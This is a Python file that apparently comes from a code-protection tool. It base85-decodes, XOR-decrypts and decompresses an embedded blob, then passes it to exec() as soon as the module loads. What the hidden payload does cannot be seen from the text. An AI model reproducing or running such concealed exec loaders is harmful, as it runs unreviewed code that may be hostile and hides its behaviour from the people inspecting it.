# -*- coding: utf-8 -*-
# Protected by Javis Universal Dynamic Encrypted Loader
import base64 as _b85, zlib as _zl
def _xload(_s, _k):
    _e = _b85.b85decode(_s)
    _o = bytearray()
    _p = 0xAA
    _kl = len(_k)
    for _i, _b in enumerate(_e):
        _o.append(_b ^ (_k[_i % _kl] ^ _p))
        _p = _b
    return _zl.decompress(bytes(_o))

_KEY = b'javis_universal_dynamic_loader_2026_'
_PAYLOAD = "xC5A{iMba~GC8YuCDgxjkt=bgFN3!ASb3G5c$>&$WHxAENVw+6GayU=^rY==!PoNSF|<pDgHfegOtF|EgpC~%rNe1aFqOM*PrFhN-~^=PTqsVJITYF{2&s%07_$tEburY%c0%@!1JeFC-^X`6D;?)WE5ILI1>CmLwNXlqq}PG6{jt)C4{T|#P6Lv*7a&c)FaZ&_u6BYq0B-AK&LE(HB5*65Jvi@H?_c3S5u*I2oN)ZE)>Ck957TlxV~W-$VHoi!T^?>$8z5SLU0p+e>pByaA3a*eTs~RxXV(4+DQ)dbG%S5ZDbSX#ov#;DcjqJP1I8MqC`pCYBMG9G@_;l3RJW8Z-yz`vEBn{<a_Q2a+b6mOFfbq;qYyqUjw@@{fCS!yQDg~il+qi#f%-!Hxjc}9|DqPTJ!y-6MjX<Q{@r&x6J?5^N)x*G6>c2svSe%?rDo%4b<prO3Bz-n3;-<}(H5FLi!Z0*i&;tfu8^RI4p?7z7H{CpG$n&m8$J#fl0bX{u@y$qvkfC<g0_0WWJ4{OiHv%`oBfmjot<;*j;>!(%7+F!I`+pCFS~}4jY+wF4mhkYz2h@wH5fYI)(J7&UT<Ywh7J6DdxhUQCSPb<PaX!IK)gz@%(#fX@ss-0YFo&!^~AaI?AOEu%^;(q9;@s7vvKN@4QqHiO<|z^bzzZ}7-+NyQH;S^arT5sa*LR^gISUnSZF+~>2>Ehb1bMEr?gul+{}@Pw7Ky_LN#5yvv%5D@g-T#lT+H)pX5TXTP;!cicJzyVle9h?t(?D3^`T0O`;YD>FKGD@#j3|-C%OXdTXtLxK(JaietIe0K6w5MthLE!glq6T~ae<*{0lE_Qyoms|wXHZ0RhT4Cl6iDN^JM?w73KNwrJ-R&tAG$Vnx1R?`+C031$)0~CtY1)yt9zbAGpCT!S*mj6Cy>gl|O=)E?e@im<!5el$w(wK(}Y91BE|8ujZIX6{o=^%jojBq@Ne$7n9TP8KS17b}(;lm&Bx1jG10*a>^n9EJC1R<RLa0@x)df7?=;Y{HVfbpuk*U8EBv|^@lvR|;uO)YE!@ucCpmUPD1wN&`1idl5@Pp9UGH9o^jm>*Q;I~)5bh~gZ5q7h|l7G)t0-;&`cu}X1)SUXQVwRa*UQFIeLt9$qxGBpVWK`myG7GNQ7j85OCP(4ZM?cH6+&r!5f$gyL?*}_%&_it%|R^~kjC!qkOo$=%RK8lVCR+dZ^_a1UnT&{O5m$?YuoCJ>RlSrxR"
exec(compile(_xload(_PAYLOAD, _KEY), __file__, "exec"), globals())
